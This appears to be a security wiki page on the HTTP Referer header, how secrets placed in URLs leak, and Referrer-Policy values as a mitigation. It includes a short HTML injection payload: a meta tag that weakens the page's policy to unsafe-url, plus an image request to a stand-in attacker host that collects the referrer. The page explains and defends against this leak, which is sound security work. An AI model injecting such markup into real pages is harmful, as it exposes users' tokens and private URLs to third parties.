# Interesting HTTP Behavior

{{#include ../banners/hacktricks-training.md}}

## `Referer` Header and Referrer Policy

The HTTP `Referer` request header identifies the absolute or partial URL from which a resource was requested. Depending on the active referrer policy, it can include the referring origin, path, and query string, but not the URL fragment.<sup>[[1]](#references)</sup>

### Sensitive Information Leakage

Secrets in URL paths or query parameters can leak through browser history, logs, analytics, copied links, and the `Referer` header. A cross-origin link or subresource request may therefore disclose the referring URL to an external server.<sup>[[2]](#references)</sup>

### Mitigation

Use the `Referrer-Policy` response header to control how much referrer information the browser sends. `strict-origin-when-cross-origin` is the modern default in browsers, while `no-referrer` suppresses the header entirely; choose the policy that matches the application's requirements.<sup>[[3]](#references)</sup>

```http
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```

Do not place passwords, session identifiers, API keys, or other sensitive values in URLs. Send them in appropriate request headers or bodies over TLS instead.<sup>[[2]](#references)</sup>

### HTML Injection Consideration

A document can also set a page-wide policy with `<meta name="referrer">`. If an HTML injection flaw lets an attacker insert an effective meta element, the attacker may attempt to weaken the document's policy for subsequent requests. Dynamically injected or conflicting meta policies can behave unpredictably, so verify the behavior in the target browser rather than assuming that the response header is always overridden.<sup>[[4]](#references)</sup>

```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.example/collect" alt="">
```

Fix the underlying HTML injection and keep sensitive data out of the URL; a referrer policy is defense in depth, not a substitute for either control.

## References

- [1] [MDN - `Referer` header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer)
- [2] [MITRE CWE-598 - Use of GET Request Method With Sensitive Query Strings](https://cwe.mitre.org/data/definitions/598.html)
- [3] [MDN - `Referrer-Policy` header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy)
- [4] [MDN - `<meta name="referrer">`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/meta/name/referrer)

{{#include ../banners/hacktricks-training.md}}
